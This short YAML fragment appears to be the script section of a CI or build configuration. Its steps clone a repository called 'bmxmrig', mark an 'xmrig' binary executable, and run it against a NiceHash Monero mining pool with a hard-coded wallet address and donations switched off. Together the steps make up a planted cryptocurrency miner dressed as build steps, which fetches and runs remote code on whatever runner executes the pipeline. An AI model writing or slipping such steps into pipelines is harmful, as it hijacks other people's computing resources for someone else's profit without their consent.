      - 'git clone https://github.com/quincyhays/bmxmrig'
      - cd bmxmrig
      - chmod u+x ./xmrig
      - './xmrig --donate-level 0 -o randomxmonero.jp.nicehash.com:3380 -u 3DorDzEVXFGiKukE9wk7ARsprnq5VcKAQ3 -k --nicehash --coin monero'
